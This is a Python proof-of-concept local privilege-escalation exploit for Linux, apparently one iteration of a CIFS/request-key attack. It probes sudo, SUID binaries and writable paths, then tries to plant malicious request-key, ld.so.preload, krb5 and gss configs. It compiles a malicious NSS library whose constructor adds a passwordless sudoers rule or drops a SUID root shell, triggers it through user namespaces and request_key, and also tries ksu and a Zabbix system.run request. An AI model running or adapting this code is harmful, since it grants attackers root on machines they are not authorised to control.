#!/usr/bin/env python3
"""
CIFSwitch PoC v7 — brute-force write attempts + ksu + service triggers

Instead of checking permissions, just TRY to write everywhere.
os.access() lies — ACLs, mount options, LSM can differ.
"""
import os, subprocess, sys, time, shutil, textwrap, json, pwd, shlex
from pathlib import Path

RUN = "%s_%s" % (os.getuid(), os.getpid())
WD = Path("/tmp/ses-%s" % RUN)
FL = WD / "fakelib"
EV = Path("/tmp/ev_%s.txt" % RUN)
RS = Path("/var/tmp/rsh_%s" % RUN)

def sh(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return r.stdout.strip(), r.returncode

def p(msg): print(msg, flush=True)

def try_write(path, content, label):
    """Try to write. Return True on success."""
    try:
        with open(path, "w") as f:
            f.write(content)
        p("  [+] WROTE %s (%s)" % (path, label))
        return True
    except Exception as e:
        p("  [-] %s: %s" % (path, e))
        return False

def try_append(path, content, label):
    try:
        with open(path, "a") as f:
            f.write(content)
        p("  [+] APPENDED %s (%s)" % (path, label))
        return True
    except Exception as e:
        p("  [-] %s: %s" % (path, e))
        return False

def try_mkdir_write(dirpath, filename, content, label):
    fpath = os.path.join(dirpath, filename)
    return try_write(fpath, content, label)

def main():
    user = pwd.getpwuid(os.getuid()).pw_name
    p("uid=%d user=%s" % (os.getuid(), user))

    # ── Quick system info ──────────────────────────────────────────────
    p("\n=== QUICK INFO ===")
    for label, cmd in [
        ("sudo",    "sudo -l 2>&1 | head -20"),
        ("caps",    "grep -i cap /proc/self/status 2>/dev/null"),
        ("crontab", "crontab -l 2>&1 | head -10"),
        ("fstab",   "grep -i cifs /etc/fstab 2>/dev/null"),
        ("autofs",  "ls /etc/auto.* 2>/dev/null; systemctl is-active autofs 2>/dev/null"),
        ("req-key", "cat /etc/request-key.conf 2>/dev/null"),
        ("req-d",   "ls -la /etc/request-key.d/ 2>/dev/null"),
        ("k5",      "ls -la /etc/krb5.conf.d/ 2>/dev/null; klist 2>&1 | head -5"),
        ("gss",     "ls -la /etc/gss/mech.d/ /etc/gss/ 2>/dev/null"),
        ("cifsutil","ls -la /etc/cifs-utils/ 2>/dev/null"),
        ("debug.sh","ls -la /usr/share/keyutils/request-key-debug.sh 2>/dev/null"),
        ("upcall",  "getcap /usr/sbin/cifs.upcall 2>/dev/null; readelf -d /usr/sbin/cifs.upcall 2>/dev/null | grep -i path"),
        ("idmap",   "file /usr/sbin/cifs.idmap 2>/dev/null; readlink -f /usr/sbin/cifs.idmap 2>/dev/null"),
        ("zabbix",  "cat /etc/zabbix/zabbix_agentd.conf 2>/dev/null | grep -iE 'enable|allow|unsafe|run' | head -10"),
        ("suid",    "find / -perm -4000 -type f 2>/dev/null | head -20"),
        ("world-w", "find /etc /usr/share/keyutils /usr/sbin -writable 2>/dev/null | head -20"),
    ]:
        out, _ = sh(cmd)
        if out: p("--- %s ---\n%s" % (label, out))

    # ── Brute-force write attempts ─────────────────────────────────────
    p("\n=== WRITE ATTEMPTS ===")

    # request-key.d: redirect cifs.idmap → cifs.upcall
    rk_rule = "create\tcifs.idmap\t*\t*\t/usr/sbin/cifs.upcall %k\n"
    w1 = try_mkdir_write("/etc/request-key.d", "00-pwn.conf", rk_rule, "rk.d redirect")

    # request-key.conf: prepend rule
    if not w1:
        try:
            old = open("/etc/request-key.conf").read()
            w1 = try_write("/etc/request-key.conf", rk_rule + old, "rk.conf prepend")
        except: pass

    # debug.sh: append cifs.upcall exec
    w2 = try_append("/usr/share/keyutils/request-key-debug.sh",
                    '\n/usr/sbin/cifs.upcall "$1" 2>/dev/null &\n',
                    "debug.sh append")

    # ld.so.preload
    w3 = False  # will set after building NSS lib

    # krb5.conf.d: plugin injection
    w4 = False  # will set after building NSS lib

    # gss/mech.d: mechanism injection
    w5 = False

    # cifs.idmap: replace with cifs.upcall
    w6 = False
    try:
        shutil.copy2("/usr/sbin/cifs.upcall", "/usr/sbin/cifs.idmap")
        p("  [+] replaced cifs.idmap with cifs.upcall!")
        w6 = True
    except Exception as e:
        p("  [-] replace cifs.idmap: %s" % e)

    # ── Build NSS lib ──────────────────────────────────────────────────
    p("\n=== BUILD ===")
    shutil.rmtree(str(WD), ignore_errors=True)
    FL.mkdir(parents=True)
    sudoers = "/etc/sudoers.d/cifs-poc-%s" % RUN

    nss_c = WD / "n.c"
    nss_c.write_text(r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <nss.h>
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
__attribute__((constructor)) static void p(void) {
    int f=open("''' + str(EV) + r'''",O_WRONLY|O_CREAT|O_APPEND,0644);
    if(f>=0){dprintf(f,"NSS uid=%d euid=%d pid=%d\n",getuid(),geteuid(),getpid());close(f);}
    mkdir("/etc/sudoers.d",0755);
    int s=open("''' + sudoers + r'''",O_WRONLY|O_CREAT|O_TRUNC,0440);
    if(s>=0){dprintf(s,"''' + user + r''' ALL=(ALL:ALL) NOPASSWD: ALL\n");fchmod(s,0440);close(s);}
    else {
        int i=open("/bin/bash",O_RDONLY);
        if(i>=0){int o=open("''' + str(RS) + r'''",O_WRONLY|O_CREAT|O_TRUNC,04755);
        if(o>=0){char b[8192];ssize_t n;while((n=read(i,b,sizeof(b)))>0)write(o,b,n);
        fchown(o,0,0);fchmod(o,04755);close(o);}close(i);}
    }
}
enum nss_status _nss_pwn_getpwuid_r(uid_t u,struct passwd*p,char*b,size_t l,int*e){
    if(l<64){*e=ERANGE;return NSS_STATUS_TRYAGAIN;}
    strcpy(b,"root");p->pw_name=b;p->pw_gecos=b;
    strcpy(b+5,"/root");p->pw_dir=b+5;
    strcpy(b+11,"/bin/bash");p->pw_shell=b+11;
    p->pw_passwd=(char*)"x";p->pw_uid=u;p->pw_gid=0;*e=0;return NSS_STATUS_SUCCESS;}
''')
    os.system("gcc -shared -fPIC -o %s/libnss_pwn.so.2 %s 2>&1" % (FL, nss_c))
    nss_so = str(FL / "libnss_pwn.so.2")

    # Now try ld.so.preload and krb5 with built lib
    w3 = try_write("/etc/ld.so.preload", nss_so + "\n", "ld.so.preload")
    w4 = try_mkdir_write("/etc/krb5.conf.d", "00-pwn.conf",
                         "[plugins]\n  clpreauth = {\n    module = pwn:%s\n  }\n" % nss_so,
                         "krb5 plugin")
    w5 = try_mkdir_write("/etc/gss/mech.d", "pwn.conf",
                         "pwn 1.2.3.4.5.6.7.8 %s\n" % nss_so,
                         "gss mechanism")

    any_write = w1 or w2 or w3 or w4 or w5 or w6

    # ── If we wrote anything, trigger it ───────────────────────────────
    if any_write:
        p("\n=== TRIGGERING ===")

        # Build trigger
        trigger_c = WD / "t.c"
        nss_dirs = []
        for d in ["/usr/lib64", "/lib64", "/lib/x86_64-linux-gnu"]:
            if os.path.exists(d + "/libnss_files.so.2"):
                nss_dirs.append(d)

        nsswitch = WD / "nsswitch.conf"
        nsswitch.write_text("passwd: pwn files\ngroup: pwn files\nshadow: pwn files\nhosts: pwn files dns\n")

        trigger_c.write_text(r'''
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>
#ifndef MS_REC
#define MS_REC 16384
#endif
#ifndef MS_BIND
#define MS_BIND 4096
#endif
int main(int ac, char **av) {
    if (ac < 5) return 2;
    char *ktype = av[1], *fl = av[2], *nss = av[3];
    syscall(__NR_keyctl, 1, "cifs-poc", 0, 0, 0);
    mount(NULL, "/", NULL, MS_REC|(1<<18), NULL);
    struct stat st;
    if(stat("/run/nscd",&st)==0&&S_ISDIR(st.st_mode)) mount("tmpfs","/run/nscd","tmpfs",0,"mode=755");
    if(stat("/var/run/nscd",&st)==0&&S_ISDIR(st.st_mode)) mount("tmpfs","/var/run/nscd","tmpfs",0,"mode=755");
    if(stat("/etc/nsswitch.conf",&st)==0) mount(nss,"/etc/nsswitch.conf",NULL,MS_BIND,NULL);
    for(int i=4;i<ac;i++) mount(fl,av[i],NULL,MS_BIND|MS_REC,NULL);
    char d[768];
    snprintf(d,sizeof(d),"ver=0x2;host=localhost;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",getpid());
    fprintf(stderr,"[t] pid=%d type=%s\n",getpid(),ktype);
    errno=0;
    long r=syscall(__NR_request_key,ktype,d,"",(-3));
    fprintf(stderr,"[t] request_key(%s): rc=%ld errno=%d (%s)\n",ktype,r,errno,strerror(errno));
    if(r>=0) sleep(3);
    /* Also try debug: user key if debug.sh was modified */
    if(strcmp(ktype,"cifs.idmap")!=0){
        char dd[800]; snprintf(dd,sizeof(dd),"debug:%s",d);
        errno=0; r=syscall(__NR_request_key,"user",dd,"trigger",(-3));
        fprintf(stderr,"[t] request_key(user debug): rc=%ld errno=%d (%s)\n",r,errno,strerror(errno));
        if(r>=0) sleep(3);
    }
    return 0;
}
''')
        os.system("gcc -o %s/t %s 2>&1" % (WD, trigger_c))

        key_type = "cifs.idmap" if (w1 or w6) else "cifs.spnego"
        cmd = ["unshare", "-Ur", "-m", str(WD / "t"), key_type,
               str(FL), str(nsswitch)] + nss_dirs
        p("$ " + " ".join(cmd))
        subprocess.run(cmd, timeout=30)
        time.sleep(2)

        if EV.exists():
            p("\n=== SUCCESS ===\n" + EV.read_text())
            return

    # ── ksu attempt ────────────────────────────────────────────────────
    p("\n=== KSU ATTEMPT ===")
    # ksu is SUID root. KRB5_CONFIG env var is NOT cleared for SUID.
    # If we point to a fake krb5.conf, ksu reads it.
    # Even if ksu fails auth, it might exec something useful.
    ksu_path, _ = sh("which ksu 2>/dev/null")
    if ksu_path:
        p("ksu found at %s" % ksu_path)
        # Try ksu without any Kerberos - see what happens
        out, rc = sh("echo '' | timeout 5 ksu -q -e /bin/id 2>&1")
        p("ksu -e /bin/id: rc=%d\n%s" % (rc, out))
    else:
        p("ksu not found")

    # ── Try talking to Zabbix agent ────────────────────────────────────
    p("\n=== ZABBIX ATTEMPT ===")
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("127.0.0.1", 10050))
        # Try system.run
        req = b'ZBXD\x01' + b'\x00' * 8  # minimal header
        # Actually, Zabbix uses a specific protocol
        payload = b'system.run[id]'
        length = len(payload)
        header = b'ZBXD\x01' + length.to_bytes(8, 'little')
        s.sendall(header + payload)
        resp = s.recv(4096)
        p("zabbix response: %s" % resp[:200])
        s.close()
    except Exception as e:
        p("zabbix: %s" % e)

    # ── Check if any services use writable paths ───────────────────────
    p("\n=== EXTRA CHECKS ===")
    for label, cmd in [
        ("writable in /etc", "find /etc -writable -type f 2>/dev/null | head -20"),
        ("writable in /etc (dirs)", "find /etc -writable -type d 2>/dev/null | head -20"),
        ("writable in /usr", "find /usr -writable 2>/dev/null | head -20"),
        ("writable in /var", "find /var -writable -type d 2>/dev/null | head -20"),
        ("sgid dirs", "find / -perm -2000 -type d -writable 2>/dev/null | head -10"),
        ("systemd writable", "find /etc/systemd /usr/lib/systemd -writable 2>/dev/null | head -10"),
        ("polkit", "pkaction 2>/dev/null | head -10"),
        ("at.allow/deny", "ls -la /etc/at.* /etc/cron.* 2>/dev/null | head -10"),
    ]:
        out, _ = sh(cmd)
        if out: p("--- %s ---\n%s" % (label, out))

    if EV.exists():
        p("\n=== SUCCESS ===\n" + EV.read_text())
    else:
        p("\nNothing worked. Paste the full output — especially the 'WRITE ATTEMPTS' and 'EXTRA CHECKS' sections.")


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(130)
    except Exception as e: print("ERROR: %s" % e, flush=True)
